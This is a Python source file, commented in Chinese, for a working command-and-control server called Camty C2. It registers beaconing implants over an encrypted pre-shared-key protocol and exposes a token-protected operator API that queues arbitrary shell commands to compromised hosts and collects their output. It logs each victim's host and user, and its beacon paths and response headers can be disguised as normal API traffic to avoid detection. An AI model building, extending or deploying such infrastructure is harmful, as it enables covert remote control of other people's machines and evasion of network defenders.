"""Camty C2 服务端 v1（功能基线）。

两个监听：
  beacon 端口：/beacon（注册/领任务）与 /result（回传结果），CMT1 加密协议
  api 端口：  operator 契约（camty c2-* 适配器直连），Bearer token 认证
      GET  /api/sessions
      POST /api/sessions/{id}/tasks   {"type":"cmd","args":{"command":"..."}}
      GET  /api/tasks/{id}            {"status","output","command","session"}

运行：
  python camty_c2.py --beacon-port 8800 --api-port 8801 \
      --token <hex> --psk <hex32> --ops-log c2-ops.jsonl
  不给 --token/--psk 时生成随机值并打印（植入体构建需要 PSK，见 implant/build.ps1）。

存储：内存 + JSONL 动作日志；beacon 每次注册自带主机信息，服务端重启后会话自愈。
"""

from __future__ import annotations

import argparse
import hmac
import json
import os
import secrets
import sys
import threading
import time
from pathlib import Path
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# vendor 引导：与 camty 包同样的规则（独立部署单元，脱离 camty 也要能跑）
_VENDOR = Path(__file__).resolve().parent.parent.parent / "vendor"
if _VENDOR.is_dir() and not os.environ.get("CAMTY_NO_VENDOR"):
    sys.path.insert(0, str(_VENDOR))

import protocol
from protocol import ProtocolError


class Store:
    def __init__(self, ops_log=None):
        self.lock = threading.RLock()  # _log 在持锁调用方内部复用，必须可重入
        self.sessions: dict[str, dict] = {}
        self.tasks: dict[str, dict] = {}
        self._ops = ops_log
        self._counter = 0

    def _log(self, action: str, detail: dict) -> None:
        if self._ops is None:
            return
        entry = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "action": action, **detail}
        with self.lock:
            with open(self._ops, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def checkin(self, info: dict) -> list[dict]:
        """beacon 注册：更新会话、领走排队任务（queued → running）。"""
        sid = str(info.get("id", "")).strip()
        if not sid:
            raise ProtocolError("beacon 缺少 id")
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        with self.lock:
            session = self.sessions.setdefault(
                sid,
                {"id": sid, "host": "", "user": "", "arch": "", "sleep": 0,
                 "first_seen": now, "last_seen": now},
            )
            session.update(
                host=info.get("host", ""),
                user=info.get("user", ""),
                arch=info.get("arch", ""),
                sleep=info.get("sleep", 0),
                last_seen=now,
            )
            queue = session.pop("queue", [])
            for tid in queue:
                self.tasks[tid]["status"] = "running"
            self._log("checkin", {"session": sid, "host": session["host"], "n_tasks": len(queue)})
            return [self.tasks[tid] for tid in queue]

    def queue(self, session_id: str, ttype: str, args: dict) -> str:
        with self.lock:
            if session_id not in self.sessions:
                raise KeyError(f"session 不存在: {session_id}")
            self._counter += 1
            task_id = f"t-{self._counter}"
            self.tasks[task_id] = {
                "id": task_id,
                "session": session_id,
                "type": ttype or "cmd",
                "args": args or {},
                "status": "queued",
                "output": "",
                "exit": None,
                "queued_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            }
            self.sessions[session_id].setdefault("queue", []).append(task_id)
            self._log("queue_task", {"task": task_id, "session": session_id, "args": args})
            return task_id

    def result(self, results: list[dict]) -> None:
        with self.lock:
            for r in results or []:
                task = self.tasks.get(str(r.get("task_id", "")))
                if task is None:
                    continue
                task["status"] = "done"
                task["output"] = r.get("output", "")
                task["exit"] = r.get("exit")
            self._log("result", {"n": len(results or [])})

    def sessions_list(self) -> list[dict]:
        with self.lock:
            return [dict(s) for s in self.sessions.values()]

    def get_task(self, task_id: str) -> dict | None:
        with self.lock:
            task = self.tasks.get(task_id)
            return dict(task) if task else None


class BeaconHandler(BaseHTTPRequestHandler):
    def do_POST(self):  # noqa: N802 - http.server 约定
        beacon_path = getattr(self.server, "beacon_path", "/beacon")
        result_path = getattr(self.server, "result_path", "/result")
        if self.path == beacon_path:
            route = "beacon"
        elif self.path == result_path:
            route = "result"
        else:
            self.send_error(404)
            return
        length = int(self.headers.get("Content-Length", 0))
        blob = self.rfile.read(length) if length else b""
        try:
            plaintext = protocol.open(self.server.psk, blob)
            payload = json.loads(plaintext.decode("utf-8"))
        except (ProtocolError, ValueError, UnicodeDecodeError):
            self.send_error(403)  # message 只能 ASCII，不回显细节
            return
        if route == "beacon":
            try:
                tasks = self.server.store.checkin(payload)
            except ProtocolError:
                self.send_error(400)
                return
            resp = {"tasks": [
                {"id": t["id"], "type": t["type"], "args": t["args"]} for t in tasks
            ]}
        else:
            self.server.store.result(payload.get("results", []))
            resp = {"ack": True}
        body = protocol.seal(
            self.server.psk,
            json.dumps(resp, ensure_ascii=False, separators=(",", ":")).encode("utf-8"),
        )
        self.send_response(200)
        # 响应头伪装（profile 可配，缺省沿用 octet-stream 兼容旧植入体）
        self.send_header("Content-Type",
                          getattr(self.server, "beacon_ctype", "application/octet-stream"))
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


class ApiHandler(BaseHTTPRequestHandler):
    def _authorized(self) -> bool:
        auth = self.headers.get("Authorization", "")
        # 恒时比较（token 逐位泄密防护）。按 UTF-8 字节比较：
        # compare_digest 的 str 形式对非 ASCII 输入会 TypeError（拒绝场景应得 401 而非 500）
        return hmac.compare_digest(auth.encode("utf-8"),
                                   f"Bearer {self.server.token}".encode("utf-8"))

    def _json(self, code: int, payload: dict) -> None:
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):  # noqa: N802
        if not self._authorized():
            self._json(401, {"error": "unauthorized"})
            return
        if self.path == "/health":
            self._json(200, {"ok": True})
        elif self.path == "/api/sessions":
            self._json(200, {"sessions": self.server.store.sessions_list()})
        elif self.path.startswith("/api/tasks/"):
            task = self.server.store.get_task(self.path[len("/api/tasks/"):])
            if task is None:
                self._json(404, {"error": "task 不存在"})
            else:
                self._json(200, task)
        else:
            self._json(404, {"error": "not found"})

    def do_POST(self):  # noqa: N802
        if not self._authorized():
            self._json(401, {"error": "unauthorized"})
            return
        prefix = "/api/sessions/"
        if self.path.startswith(prefix) and self.path.endswith("/tasks"):
            sid = self.path[len(prefix): -len("/tasks")]
            length = int(self.headers.get("Content-Length", 0))
            try:
                req = json.loads(self.rfile.read(length) or b"{}")
            except ValueError:
                self._json(400, {"error": "body 非合法 JSON"})
                return
            ttype = req.get("type", "cmd")
            args = req.get("args") or {}
            if isinstance(args, str):
                args = {"command": args}
            if ttype == "cmd" and not args.get("command"):
                self._json(400, {"error": "cmd 任务需要 args.command"})
                return
            try:
                task_id = self.server.store.queue(sid, ttype, args)
            except KeyError as exc:
                self._json(404, {"error": str(exc)})
                return
            self._json(200, {"task_id": task_id})
        else:
            self._json(404, {"error": "not found"})

    def log_message(self, *args):
        pass


def main() -> None:
    parser = argparse.ArgumentParser(prog="camty-c2", description="Camty C2 服务端 v1")
    parser.add_argument("--beacon-port", type=int, default=8800)
    parser.add_argument("--api-port", type=int, default=8801)
    parser.add_argument("--token", help="operator API token（缺省随机生成并打印）")
    parser.add_argument("--psk", help="32 字节 hex 预共享密钥（植入体构建时需一致）")
    parser.add_argument("--ops-log", default="c2-ops.jsonl")
    parser.add_argument("--bind", default="127.0.0.1",
                        help="beacon 端口绑定地址（公网部署用 0.0.0.0）")
    parser.add_argument("--api-bind", default="127.0.0.1",
                        help="operator API 绑定地址（保持 127.0.0.1，走 SSH 隧道访问）")
    # 伪装 profile（与植入体 build.ps1 -PathBeacon/-PathResult/-Ctype 一致）
    parser.add_argument("--beacon-path", default="/beacon",
                        help="beacon 注册 URI（伪装成正常 API 路径，如 /api/v1/heartbeat）")
    parser.add_argument("--result-path", default="/result",
                        help="结果回传 URI（如 /api/v1/report）")
    parser.add_argument("--beacon-ctype", default="application/octet-stream",
                        help="beacon 响应 Content-Type 伪装（如 application/json）")
    args = parser.parse_args()

    token = args.token or secrets.token_hex(16)
    psk = bytes.fromhex(args.psk) if args.psk else protocol.gen_psk()
    if len(psk) != protocol.KEY_LEN:
        raise SystemExit(f"psk 必须为 {protocol.KEY_LEN} 字节 hex")

    store = Store(args.ops_log)
    beacon_srv = ThreadingHTTPServer((args.bind, args.beacon_port), BeaconHandler)
    api_srv = ThreadingHTTPServer((args.api_bind, args.api_port), ApiHandler)
    beacon_srv.psk = api_srv.psk = psk
    beacon_srv.token = api_srv.token = token
    beacon_srv.store = api_srv.store = store
    beacon_srv.beacon_path = args.beacon_path
    beacon_srv.result_path = args.result_path
    beacon_srv.beacon_ctype = args.beacon_ctype

    print(
        f"Camty C2 v1 | beacon http://{args.bind}:{args.beacon_port} | "
        f"api http://{args.bind}:{args.api_port}\n"
        f"  operator token: {token}\n"
        f"  PSK(hex): {psk.hex()}  <- implant/build.ps1 用这个构建植入体"
    )
    threading.Thread(target=beacon_srv.serve_forever, daemon=True).start()
    try:
        api_srv.serve_forever()
    except KeyboardInterrupt:
        print("\nshutting down")


if __name__ == "__main__":
    main()
